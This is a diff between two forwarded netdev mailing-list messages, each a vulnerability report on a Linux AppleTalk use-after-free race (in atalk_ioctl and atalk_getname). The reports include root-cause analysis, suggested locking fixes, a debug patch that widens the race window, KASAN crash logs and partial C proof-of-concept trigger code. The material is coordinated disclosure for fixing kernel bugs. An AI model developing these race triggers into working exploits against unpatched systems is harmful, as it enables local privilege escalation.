@@ -1,37 +1,37 @@
-Return-Path: <netdev+bounces-38745-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-38746-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 9189A7BC50E
-	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:37:50 +0200 (CEST)
+Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [139.178.88.99])
+	by mail.lfdr.de (Postfix) with ESMTPS id DDA4F7BC519
+	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 08:41:11 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by ny.mirrors.kernel.org (Postfix) with ESMTPS id 9C53E1C2094B
-	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:37:49 +0000 (UTC)
+	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 7EB452820EA
+	for <lists+netdev@lfdr.de>; Sat,  7 Oct 2023 06:41:10 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id 86EB979D1;
-	Sat,  7 Oct 2023 06:37:47 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id A787079D2;
+	Sat,  7 Oct 2023 06:41:08 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org; dkim=none
 X-Original-To: netdev@vger.kernel.org
 Received: from lindbergh.monkeyblade.net (lindbergh.monkeyblade.net [23.128.96.19])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 6962C746B
-	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:37:45 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A21236FCB
+	for <netdev@vger.kernel.org>; Sat,  7 Oct 2023 06:41:06 +0000 (UTC)
 Received: from 1wt.eu (ded1.1wt.eu [163.172.96.212])
-	by lindbergh.monkeyblade.net (Postfix) with ESMTP id 99963BD
-	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:37:41 -0700 (PDT)
+	by lindbergh.monkeyblade.net (Postfix) with ESMTP id 548AABF
+	for <netdev@vger.kernel.org>; Fri,  6 Oct 2023 23:41:02 -0700 (PDT)
 Received: (from willy@localhost)
-	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976baQ8021177;
-	Sat, 7 Oct 2023 08:37:36 +0200
-Date: Sat, 7 Oct 2023 08:37:36 +0200
+	by pcw.home.local (8.15.2/8.15.2/Submit) id 3976en0J021194;
+	Sat, 7 Oct 2023 08:40:49 +0200
+Date: Sat, 7 Oct 2023 08:40:49 +0200
 From: Willy Tarreau <w@1wt.eu>
 To: netdev@vger.kernel.org
 Cc: rootlab@huawei.com
-Subject: Fwd: Race Condition Vulnerability in atalk_ioctl of nfc module
+Subject: Fwd: Race Condition Vulnerability in atalk_getname of nfc module
  leading to UAF
-Message-ID: <20231007063736.GV20998@1wt.eu>
+Message-ID: <20231007064048.GX20998@1wt.eu>
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
@@ -56,142 +56,107 @@ better addressed here.
 Regards,
 Willy
 
-PS: there are 6 reports for atalk in this series.
+PS: actually there were 8, not 6 reports for atalk in this series.
 
 ----- Forwarded message from rootlab <rootlab@huawei.com> -----
 
-> Date: Sat, 7 Oct 2023 03:11:19 +0000
+> Date: Sat, 7 Oct 2023 03:11:48 +0000
 > From: rootlab <rootlab@huawei.com>
-> Subject: Race Condition Vulnerability in atalk_ioctl of nfc module leading to UAF
+> Subject: Race Condition Vulnerability in atalk_getname of nfc module leading to UAF
 > To: "security@kernel.org" <security@kernel.org>
 > Delivered-To: security@kernel.org
 > 
-> I recently found an race condition Vulnerability in the atalk_ioctl, which leads to the kernel access free'd skb pointer.
+> I recently found an race condition Vulnerability in the atalk_getname, which leads to the kernel access free'd stalk_addr object.
 > 
 > The vulnerability code presented below is located in Linux 6.5-rc5, and it is possible that other versions may also be affected.
 > 
 > [Root Cause]
 > 
-> when cmd = TIOCINQ, atalk_ioctl whill obtain skb through skb_peek and then read skb->len to userspace.
+> key code of atalk_getname:
 > 
-> atalk_ioctl don't hold any locks.
+>   *   atalk_getname
 > 
-> static int atalk_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
+>      *   atalk_autobind
+> 
+>         *   struct atalk_addr *ap = atalk_find_primary()
+>         *   use ap
+> 
+> important notes:
+> 
+>   *   atalk_getname hold the lock of sk , then it call atalk_autobind.
+>   *   atalk_autobind use atalk_find_primary to find the ap and use the ap.
+> 
+> atalk_find_primary will search for iface from the atalk_interfaces linked list and finally return &fiface->address
+> 
+> static struct atalk_addr *atalk_find_primary(void)
 > {
->         int rc = -ENOIOCTLCMD;
->         struct sock *sk = sock->sk;
->         void __user *argp = (void __user *)arg;
+>         struct atalk_iface *fiface = NULL;
+>         struct atalk_addr *retval;
+>         struct atalk_iface *iface;
 > 
->         switch (cmd) {
->         case TIOCINQ: {
->                 struct sk_buff *skb = skb_peek(&sk->sk_receive_queue);
->                 long amount = 0;
->                 if (skb)
->                         amount = skb->len - sizeof(struct ddpehdr);
->                 rc = put_user(amount, (int __user *)argp);
->                 break;
+>         /*
+>          * Return a point-to-point interface only if
+>          * there is no non-ptp interface available.
+>          */
+>         read_lock_bh(&atalk_interfaces_lock);
+>         for (iface = atalk_interfaces; iface; iface = iface->next) {
+>                 if (!fiface && !(iface->dev->flags & IFF_LOOPBACK))
+>                         fiface = iface;
+>                 if (!(iface->dev->flags & (IFF_LOOPBACK | IFF_POINTOPOINT))) {
+>                         retval = &iface->address;
+>                         goto out;
+>                 }
 >         }
 > 
-> 
-> skb_peek returns the head node of the sk->sk_receive_queue linked list, but it does not increase the reference count of the skb.
-> 
-> static inline struct sk_buff *skb_peek(const struct sk_buff_head *list_)
-> {
->         struct sk_buff *skb = list_->next;
-> 
->         if (skb == (struct sk_buff *)list_)
->                 skb = NULL;
->         return skb;
+>         if (fiface)
+>                 retval = &fiface->address;
+>         else if (atalk_interfaces)
+>                 retval = &atalk_interfaces->address;
+>         else
+>                 retval = NULL;
+> out:
+>         read_unlock_bh(&atalk_interfaces_lock);
+>         return retval;
 > }
 > 
 > 
-> atalk_recvmsg fetches the skb from sk->sk_receive_queue and then free the skb by skb_free_datagram.
+> iface can be free'd through ioctl(at_fd, SIOCDIFADDR, &atreq);.
 > 
-> static int atalk_recvmsg(struct sock *sk, struct msghdr *msg, size_t len,
->                       int flags, int *addr_len)
-> {
->         struct sk_buff *skb = NULL;
->         skb = skb_recv_datagram(sk, flags, &rval);
->     lock_sock(sk);
->         .......
+>   *   atalk_ioctl
 > 
->         skb_free_datagram(sk, skb);  // free skb
->     release_sock(sk);
->         return rval;
-> }
+>      *   rtnl_lock();
 > 
+>      *   atalk_dev_down
 > 
-> steps to trigger the bug:
+>         *   atif_drop_device
 > 
->   1.  thread A enter atalk_ioctl and get skb by skb_peek.
->   2.  thread B use atalk_recvmsg free the skb
->   3.  thread A read skb->len, but now skb has been released
+>            *   kfree(tmp);
+>      *   rtnl_unlock();
 > 
->                                          Time
->                                           +
->                                           |
->   thread A                                | thread B
->   atalk_ioctl                             | atalk_recvmsg
->                                           |
->     skb = skb_peek(&sk->sk_receive_queue) |
->                                           |
->                                           |
->                                           |     skb_free_datagram(sk, skb);  // free skb
->                                           |
->                                           |
->     amount = skb->len - xxx;              |
->                                           |
->                                           +
+> During the atalk_ioctl --> atif_drop_device process, only the rtnl lock is obtained. Inconsistency between the rtnl lock and the atalk_bind lock causes UAF.
+> 
+>                                                   Time
+>                                                    +
+>                                                    |
+> thread A                                           |  thread B
+> atalk_autobi                                       |  ioctl --> atalk_dev_down
+>                                                    |
+>                                                    |
+>   1.struct atalk_addr *ap = atalk_find_primary()   |
+>                                                    |
+>                                                    |
+>                                                    |     2.atif_drop_device(dev)  --> free ap
+>                                                    |
+>                                                    |
+>     // UAF!                                        |
+>   3.use ap                                         |
+>                                                    +
 > 
 > 
 > [Patch Suggestion]
 > 
-> atalk_ioctl needs to obtain the sk->sk_receive_queue.lock when read skb.
-> 
-> From 6e1af54bd4045660a8f2f42e1628fdbbcfb47b79 Mon Sep 17 00:00:00 2001
-> From: luosili <rootlab@huawei.com>
-> Date: Wed, 27 Sep 2023 18:13:13 +0800
-> Subject: [PATCH] appletalk: fix uaf in atalk_ioctl
-> 
-> hold sk->sk_receive_queue.lock in atalk_ioctl
-> to prevent other thread free skb.
-> 
-> Signed-off-by: luosili <rootlab@huawei.com>
-> ---
->  net/appletalk/ddp.c | 3 ++-
->  1 file changed, 2 insertions(+), 1 deletion(-)
-> 
-> diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
-> index 8978fb6212ff..219bf2e89814 100644
-> --- a/net/appletalk/ddp.c
-> +++ b/net/appletalk/ddp.c
-> @@ -1790,7 +1790,6 @@ static int atalk_recvmsg(struct socket *sock, struct msghdr *msg, size_t size,
->         return err ? : copied;
->  }
-> 
-> -
->  /*
->   * AppleTalk ioctl calls.
->   */
-> @@ -1815,12 +1814,14 @@ static int atalk_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
->                  * These two are safe on a single CPU system as only
->                  * user tasks fiddle here
->                  */
-> +               spin_lock_bh(&sk->sk_receive_queue.lock);
->                 struct sk_buff *skb = skb_peek(&sk->sk_receive_queue);
->                 long amount = 0;
-> 
->                 if (skb)
->                         amount = skb->len - sizeof(struct ddpehdr);
->                 rc = put_user(amount, (int __user *)argp);
-> +               spin_unlock_bh(&sk->sk_receive_queue.lock);
->                 break;
->         }
->         /* Routing */
-> --
-> 2.25.1
-> 
-> 
+>   1.  add refcount for struct atalk_addr
+>   2.  Use the right lock
 > 
 > [Proof-of-Concept]
 > 
@@ -199,28 +164,28 @@ PS: there are 6 reports for atalk in this series.
 > 
 > Test Environment:qemu x86_64 + linux 6.5-rc5 + kasan
 > 
-> To increase the probability of race, I add some loops to the race part of the code ( pn_ioctl ) to increase the time window.
+> To increase the probability of race, I add some loops to the race part of the code ( atalk_autobind ) to increase the time window.
 > 
 > the dxxx() function just do some loop to increase the time window.
 > 
-> From ac85eb34db26539370628277787ce5dacdae2186 Mon Sep 17 00:00:00 2001
+> From 92be4dc3450dda7016bced0b5fcd59bfdc2f8c92 Mon Sep 17 00:00:00 2001
 > From: luosili <rootlab@huawei.com>
-> Date: Wed, 27 Sep 2023 18:15:20 +0800
-> Subject: [PATCH] appletalk: patch for race in atalk_ioctl
+> Date: Wed, 27 Sep 2023 18:19:34 +0800
+> Subject: [PATCH] appletalk: patch for race in atalk_getname
 > 
 > add some loops in the race code.
 > 
 > Signed-off-by: luosili <rootlab@huawei.com>
 > ---
->  net/appletalk/ddp.c | 15 +++++++++++++++
->  1 file changed, 15 insertions(+)
+>  net/appletalk/ddp.c | 14 ++++++++++++++
+>  1 file changed, 14 insertions(+)
 > 
 > diff --git a/net/appletalk/ddp.c b/net/appletalk/ddp.c
-> index 8978fb6212ff..6343fa64c413 100644
+> index 8978fb6212ff..2656a35df80b 100644
 > --- a/net/appletalk/ddp.c
 > +++ b/net/appletalk/ddp.c
-> @@ -1790,6 +1790,18 @@ static int atalk_recvmsg(struct socket *sock, struct msghdr *msg, size_t size,
->         return err ? : copied;
+> @@ -1114,6 +1114,19 @@ try_next_port:;
+>         return retval;
 >  }
 > 
 > +#pragma GCC push_options
@@ -235,19 +200,18 @@ PS: there are 6 reports for atalk in this series.
 > +       return xxx;
 > +}
 > +#pragma GCC pop_options
-> 
->  /*
->   * AppleTalk ioctl calls.
-> @@ -1818,6 +1830,9 @@ static int atalk_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
->                 struct sk_buff *skb = skb_peek(&sk->sk_receive_queue);
->                 long amount = 0;
-> 
-> +               printk("vuln: [atalk_ioctl] %llx\n", (uint64_t)skb);
-> +               dxxx();
 > +
->                 if (skb)
->                         amount = skb->len - sizeof(struct ddpehdr);
->                 rc = put_user(amount, (int __user *)argp);
+>  static int atalk_autobind(struct sock *sk)
+>  {
+>         struct atalk_sock *at = at_sk(sk);
+> @@ -1121,6 +1134,7 @@ static int atalk_autobind(struct sock *sk)
+>         struct atalk_addr *ap = atalk_find_primary();
+>         int n = -EADDRNOTAVAIL;
+> 
+> +       dxxx();
+>         if (!ap || ap->s_net == htons(ATADDR_ANYNET))
+>                 goto out;
+> 
 > --
 > 2.25.1
 > 
@@ -255,129 +219,103 @@ PS: there are 6 reports for atalk in this series.
 > 
 > panic log
 > 
-> # /tmp/skb_uaf
+> # /tmp/atalk_getname
 > fd: 3
-> 22222
-> [ 5267.635684] vuln: [atalk_sendmsg] sk:ffff88800b1d7000
-> [ 5267.636647] vuln: [atalk_sendmsg] ffff8880079ea6c0
-> [ 5268.085176] vuln: [atalk_sendmsg] do use ffff8880079ea6c0
-> [ 5268.085946] [atalk_rcv]
-> [ 5268.086133] [atalk_search_socket] iter sk ffff88800b1d7000 80 c 3
-> Packet sent successfully.
-> [ 5268.103226] vuln: [atalk_ioctl] ffff88800f53cb40
-> [ 5268.122994] vuln: [atalk_recvmsg] sk:ffff88800b1d7000
-> [ 5268.559316] ==================================================================
-> [ 5268.559851] BUG: KASAN: slab-use-after-free in atalk_ioctl+0x1ce/0x210 [appletalk]
-> [ 5268.560454] Read of size 4 at addr ffff88800f53cbb0 by task skb_uaf/363
-> [ 5268.560926]
-> [ 5268.561062] CPU: 1 PID: 363 Comm: skb_uaf Tainted: G           OE      6.5.0-rc5 #7
-> [ 5268.561607] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
-> [ 5268.562251] Call Trace:
-> [ 5268.562438]  <TASK>
-> [ 5268.562592]  dump_stack_lvl+0x4c/0x70
-> [ 5268.562883]  print_report+0xd3/0x620
-> [ 5268.563156]  ? kasan_complete_mode_report_info+0x7d/0x200
-> [ 5268.563554]  ? atalk_ioctl+0x1ce/0x210 [appletalk]
-> [ 5268.563917]  kasan_report+0xc2/0x100
-> [ 5268.564182]  ? atalk_ioctl+0x1ce/0x210 [appletalk]
-> [ 5268.564545]  __asan_load4+0x84/0xb0
-> [ 5268.564805]  atalk_ioctl+0x1ce/0x210 [appletalk]
-> [ 5268.565157]  sock_do_ioctl+0xb9/0x1a0
-> [ 5268.565433]  ? hrtimer_active+0x86/0xc0
-> [ 5268.565731]  ? __pfx_sock_do_ioctl+0x10/0x10
-> [ 5268.566046]  ? hrtimer_try_to_cancel+0x74/0x1e0
-> [ 5268.566378]  ? __pfx_hrtimer_try_to_cancel+0x10/0x10
-> [ 5268.566732]  ? kfree+0x7a/0x120
-> [ 5268.566980]  sock_ioctl+0x1b1/0x420
-> [ 5268.567235]  ? __pfx_do_nanosleep+0x10/0x10
-> [ 5268.567552]  ? __pfx_sock_ioctl+0x10/0x10
-> [ 5268.567847]  ? hrtimer_nanosleep+0x129/0x220
-> [ 5268.568159]  ? __pfx_hrtimer_nanosleep+0x10/0x10
-> [ 5268.568494]  do_vfs_ioctl+0x42c/0xd00
-> [ 5268.568755]  ? __pfx_do_vfs_ioctl+0x10/0x10
-> [ 5268.569045]  ? get_timespec64+0xb6/0x110
-> [ 5268.569318]  ? __pfx_get_timespec64+0x10/0x10
-> [ 5268.569625]  ? __kmalloc_node+0x68/0x160
-> [ 5268.569906]  ? __pfx_restore_fpregs_from_fpstate+0x10/0x10
-> [ 5268.570288]  ? common_nsleep+0x6b/0x80
-> [ 5268.570555]  ? __kasan_check_write+0x18/0x20
-> [ 5268.570860]  ? switch_fpu_return+0x9f/0x150
-> [ 5268.571156]  ? exit_to_user_mode_prepare+0x9b/0x190
-> [ 5268.571509]  ? __rcu_read_unlock+0x5b/0x280
-> [ 5268.571809]  ? __fget_light+0x1ca/0x1f0
-> [ 5268.572087]  __x64_sys_ioctl+0x95/0x110
-> [ 5268.572359]  do_syscall_64+0x60/0x90
-> [ 5268.572616]  ? syscall_exit_to_user_mode+0x2a/0x50
-> [ 5268.572952]  ? ret_from_fork+0x2d/0x70
-> [ 5268.573218]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
-> [ 5268.573576] RIP: 0033:0x45deab
-> [ 5268.573800] Code: 0f 92 c0 84 c0 75 b0 49 8d 3c 1c e8 5f f3 02 00 85 c0 78 b1 48 83 c4 08 4c 89 e0 5b 41 5c c3 f3 0f 1e fa b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
-> [ 5268.575054] RSP: 002b:00007fd74895bd98 EFLAGS: 00000202 ORIG_RAX: 0000000000000010
-> [ 5268.575599] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000045deab
-> [ 5268.576090] RDX: 00007fd74895bda0 RSI: 000000000000541b RDI: 0000000000000004
-> [ 5268.576572] RBP: 00007fd74895bdb0 R08: 0000000000000000 R09: 00007fd74895c700
-> [ 5268.577058] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffcc2ea134e
-> [ 5268.577550] R13: 00007ffcc2ea134f R14: 00007ffcc2ea1350 R15: 00007fd74895be80
-> [ 5268.578041]  </TASK>
-> [ 5268.578208]
-> [ 5268.578325] Allocated by task 361:
-> [ 5268.578572]  kasan_save_stack+0x2a/0x50
-> [ 5268.578859]  kasan_set_track+0x29/0x40
-> [ 5268.579140]  kasan_save_alloc_info+0x1f/0x30
-> [ 5268.579439]  __kasan_slab_alloc+0x91/0xa0
-> [ 5268.579736]  kmem_cache_alloc_node+0x1a1/0x570
-> [ 5268.580050]  __alloc_skb+0x1f0/0x270
-> [ 5268.580310]  alloc_skb_with_frags+0x65/0x340
-> [ 5268.580614]  sock_alloc_send_pskb+0x4e4/0x520
-> [ 5268.580922]  atalk_sendmsg+0x403/0xc70 [appletalk]
-> [ 5268.581286]  sock_sendmsg+0xef/0x100
-> [ 5268.581537]  __sys_sendto+0x1bd/0x270
-> [ 5268.581796]  __x64_sys_sendto+0x84/0xa0
-> [ 5268.582066]  do_syscall_64+0x60/0x90
-> [ 5268.582320]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
-> [ 5268.582666]
-> [ 5268.582780] Freed by task 362:
-> [ 5268.582997]  kasan_save_stack+0x2a/0x50
-> [ 5268.583272]  kasan_set_track+0x29/0x40
-> [ 5268.583543]  kasan_save_free_info+0x2f/0x50
-> [ 5268.583833]  __kasan_slab_free+0x12e/0x1c0
-> [ 5268.584118]  kmem_cache_free+0x235/0x4f0
-> [ 5268.584391]  kfree_skbmem+0x74/0xf0
-> [ 5268.584641]  consume_skb+0x69/0x140
-> [ 5268.584887]  skb_free_datagram+0x15/0x20
-> [ 5268.585166]  atalk_recvmsg+0x17c/0x2b0 [appletalk]
-> [ 5268.585513]  sock_recvmsg+0xfa/0x100
-> [ 5268.585769]  __sys_recvfrom+0x161/0x230
-> [ 5268.586039]  __x64_sys_recvfrom+0x84/0xa0
-> [ 5268.586320]  do_syscall_64+0x60/0x90
-> [ 5268.586575]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
-> [ 5268.586923]
-> [ 5268.587038] The buggy address belongs to the object at ffff88800f53cb40
-> [ 5268.587038]  which belongs to the cache skbuff_head_cache of size 232
-> [ 5268.587930] The buggy address is located 112 bytes inside of
-> [ 5268.587930]  freed 232-byte region [ffff88800f53cb40, ffff88800f53cc28)
-> [ 5268.588751]
-> [ 5268.588866] The buggy address belongs to the physical page:
-> [ 5268.589249] page:00000000b8b7362a refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xf53c
-> [ 5268.589899] head:00000000b8b7362a order:1 entire_mapcount:0 nr_pages_mapped:0 pincount:0
-> [ 5268.590444] flags: 0xfffffc0010200(slab|head|node=0|zone=1|lastcpupid=0x1fffff)
-> [ 5268.590958] page_type: 0xffffffff()
-> [ 5268.591211] raw: 000fffffc0010200 ffff888006aa4c80 dead000000000122 0000000000000000
-> [ 5268.591752] raw: 0000000000000000 0000000080190019 00000001ffffffff 0000000000000000
-> [ 5268.592267] page dumped because: kasan: bad access detected
-> [ 5268.592647]
-> [ 5268.592761] Memory state around the buggy address:
-> [ 5268.593090]  ffff88800f53ca80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
-> [ 5268.593584]  ffff88800f53cb00: fc fc fc fc fc fc fc fc fa fb fb fb fb fb fb fb
-> [ 5268.594075] >ffff88800f53cb80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-> [ 5268.594567]                                      ^
-> [ 5268.594897]  ffff88800f53cc00: fb fb fb fb fb fc fc fc fc fc fc fc fc fc fc fc
-> [ 5268.595392]  ffff88800f53cc80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
-> [ 5268.595890] ==================================================================
-> [ 5268.596403] Disabling lock debugging due to kernel taint
-> use done
-> [ 5269.598135] vuln: [atalk_release] sk:ffff88800b1d7000
-> [ 5269.599386] vuln: [atalk_release] sk:ffff88800b1d5000
+> [   32.238260] ==================================================================
+> [   32.240272] BUG: KASAN: slab-use-after-free in atalk_autobind+0x82/0x150 [appletalk]
+> [   32.242194] Read of size 2 at addr ffff88800d2e0248 by task atalk_getname/164
+> [   32.243805]
+> [   32.244170] CPU: 1 PID: 164 Comm: atalk_getname Tainted: G           OE      6.5.0-rc5 #7
+> [   32.246107] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
+> [   32.248182] Call Trace:
+> [   32.248801]  <TASK>
+> [   32.249337]  dump_stack_lvl+0x4c/0x70
+> [   32.250208]  print_report+0xd3/0x620
+> [   32.251028]  ? kasan_complete_mode_report_info+0x7d/0x200
+> [   32.252268]  ? atalk_autobind+0x82/0x150 [appletalk]
+> [   32.253500]  kasan_report+0xc2/0x100
+> [   32.254360]  ? atalk_autobind+0x82/0x150 [appletalk]
+> [   32.255547]  __asan_load2+0x7d/0xb0
+> [   32.256364]  atalk_autobind+0x82/0x150 [appletalk]
+> [   32.257567]  ? __pfx_atalk_autobind+0x10/0x10 [appletalk]
+> [   32.258843]  ? aa_sk_perm+0x183/0x3b0
+> [   32.259723]  ? _raw_spin_unlock_bh+0x21/0x30
+> [   32.260710]  atalk_getname+0xba/0x210 [appletalk]
+> [   32.261933]  ? __pfx_atalk_getname+0x10/0x10 [appletalk]
+> [   32.263283]  __sys_getsockname+0xeb/0x180
+> [   32.264303]  ? __pfx___sys_getsockname+0x10/0x10
+> [   32.265406]  ? __kasan_check_write+0x18/0x20
+> [   32.266436]  ? switch_fpu_return+0x9f/0x150
+> [   32.267497]  ? exit_to_user_mode_prepare+0x9b/0x190
+> [   32.268729]  ? syscall_exit_to_user_mode+0x2a/0x50
+> [   32.269854]  __x64_sys_getsockname+0x47/0x60
+> [   32.270861]  do_syscall_64+0x60/0x90
+> [   32.271692]  ? exit_to_user_mode_prepare+0x9b/0x190
+> [   32.272846]  ? syscall_exit_to_user_mode+0x2a/0x50
+> [   32.274062]  ? ret_from_fork+0x2d/0x70
+> [   32.274999]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
+> [   32.276215] RIP: 0033:0x4605cb
+> [   32.276990] Code: 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa b8 33 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48
+> [   32.281398] RSP: 002b:00007fa018906d88 EFLAGS: 00000246 ORIG_RAX: 0000000000000033
+> [   32.283236] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00000000004605cb
+> [   32.285048] RDX: 0000000000000010 RSI: 00007fa018906d90 RDI: 0000000000000003
+> [   32.286726] RBP: 00007fa018906db0 R08: 0000000000000000 R09: 00007fa018907700
+> [   32.288387] R10: 00007fa0189079d0 R11: 0000000000000246 R12: 00007ffd916160ae
+> [   32.290208] R13: 00007ffd916160af R14: 00007ffd916160b0 R15: 00007fa018906e80
+> [   32.292133]  </TASK>
+> [   32.292712]
+> [   32.293089] Allocated by task 162:
+> [   32.293893]  kasan_save_stack+0x2a/0x50
+> [   32.294898]  kasan_set_track+0x29/0x40
+> [   32.295817]  kasan_save_alloc_info+0x1f/0x30
+> [   32.296875]  __kasan_kmalloc+0xb5/0xc0
+> [   32.297863]  kmalloc_trace+0x4e/0xb0
+> [   32.298812]  atif_ioctl+0x904/0xaf0 [appletalk]
+> [   32.300002]  atalk_ioctl+0x124/0x210 [appletalk]
+> [   32.301189]  sock_do_ioctl+0xb9/0x1a0
+> [   32.302168]  sock_ioctl+0x1b1/0x420
+> [   32.303092]  __x64_sys_ioctl+0xd1/0x110
+> [   32.304116]  do_syscall_64+0x60/0x90
+> [   32.305070]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
+> [   32.306276]
+> [   32.306643] Freed by task 163:
+> [   32.307359]  kasan_save_stack+0x2a/0x50
+> [   32.308335]  kasan_set_track+0x29/0x40
+> [   32.309277]  kasan_save_free_info+0x2f/0x50
+> [   32.310296]  __kasan_slab_free+0x12e/0x1c0
+> [   32.311252]  __kmem_cache_free+0x1b9/0x380
+> [   32.312214]  kfree+0x7a/0x120
+> [   32.312960]  atif_drop_device+0xad/0x100 [appletalk]
+> [   32.314281]  atif_ioctl+0x1f9/0xaf0 [appletalk]
+> [   32.315484]  atalk_ioctl+0x124/0x210 [appletalk]
+> [   32.316678]  sock_do_ioctl+0xb9/0x1a0
+> [   32.317678]  sock_ioctl+0x1b1/0x420
+> [   32.318606]  __x64_sys_ioctl+0xd1/0x110
+> [   32.319617]  do_syscall_64+0x60/0x90
+> [   32.320568]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
+> [   32.321759]
+> [   32.322177] The buggy address belongs to the object at ffff88800d2e0240
+> [   32.322177]  which belongs to the cache kmalloc-32 of size 32
+> [   32.325341] The buggy address is located 8 bytes inside of
+> [   32.325341]  freed 32-byte region [ffff88800d2e0240, ffff88800d2e0260)
+> [   32.328094]
+> [   32.328513] The buggy address belongs to the physical page:
+> [   32.329892] page:0000000097ead656 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0xd2e0
+> [   32.332226] flags: 0xfffffc0000200(slab|node=0|zone=1|lastcpupid=0x1fffff)
+> [   32.334025] page_type: 0xffffffff()
+> [   32.334944] raw: 000fffffc0000200 ffff888006842500 dead000000000122 0000000000000000
+> [   32.336910] raw: 0000000000000000 0000000000400040 00000001ffffffff 0000000000000000
+> [   32.338722] page dumped because: kasan: bad access detected
+> [   32.340072]
+> [   32.340429] Memory state around the buggy address:
+> [   32.341596]  ffff88800d2e0100: 00 00 00 00 fc fc fc fc 00 00 00 02 fc fc fc fc
+> [   32.343301]  ffff88800d2e0180: fa fb fb fb fc fc fc fc 00 00 03 fc fc fc fc fc
+> [   32.345141] >ffff88800d2e0200: fa fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
+> [   32.346985]                                               ^
+> [   32.348437]  ffff88800d2e0280: 00 00 03 fc fc fc fc fc 00 00 00 fc fc fc fc fc
+> [   32.350308]  ffff88800d2e0300: 00 00 03 fc fc fc fc fc 00 00 00 fc fc fc fc fc
+> [   32.352381] ==================================================================
+> [   32.374651] Disabling lock debugging due to kernel taint
 > #
 > 
 > 
@@ -391,8 +329,8 @@ PS: there are 6 reports for atalk in this series.
 > #define _GNU_SOURCE
 > #include <errno.h>
 > #include <fcntl.h>
-> #include <linux/atalk.h>
 > #include <linux/if_tun.h>
+> #include <linux/atalk.h>
 > #include <net/if.h>
 > #include <pthread.h>
 > #include <sched.h>
@@ -405,7 +343,6 @@ PS: there are 6 reports for atalk in this series.
 > #include <time.h>
 > #include <unistd.h>
 > 
-> #include <net/route.h>
 > 
 > #include <linux/if_ether.h>
 > #include <linux/if_packet.h>
@@ -435,6 +372,8 @@ PS: there are 6 reports for atalk in this series.
 > #include <stdlib.h>
 > #include <string.h>
 > #include <sys/socket.h>
+> #include <net/route.h>
+> 
 > 
 > void pincpu(int cpu) {
 >   cpu_set_t set;
@@ -450,128 +389,54 @@ PS: there are 6 reports for atalk in this series.
 > #define THREAD_NUMS 2
 > pthread_barrier_t barrier;
 > 
-> #define ETH_P_X25 0x0805
-> int xxx_raw_fd = 0;
+> 
+> void del() {
+> 
+>   struct ifreq atreq;
+>   strcpy(atreq.ifr_ifrn.ifrn_name, "lo");
+> 
+>   struct sockaddr_at * sa = (struct sockaddr_at *)&atreq.ifr_addr;
+> 
+>   sa->sat_family = AF_APPLETALK;
+>   struct atalk_netrange * nr = (struct atalk_netrange *)&sa->sat_zero[0];
+>   nr->nr_phase = 2;
+>   sa->sat_addr.s_node = 3;
+>   sa->sat_addr.s_net = 12;
+> 
+>   ioctl(at_fd, SIOCDIFADDR, &atreq);
+> }
 > 
 > void free_thread() {
 >   pincpu(0);
 > 
 >   srand(time(NULL));
 > 
->   struct sockaddr_at addr = {0};
->   addr.sat_family = AF_APPLETALK;    // ?????
->   addr.sat_addr.s_net = htons(0x20); // ????
->   addr.sat_addr.s_node = 0;
->   addr.sat_port = 0;
 > 
 >   usleep(35000);
 > 
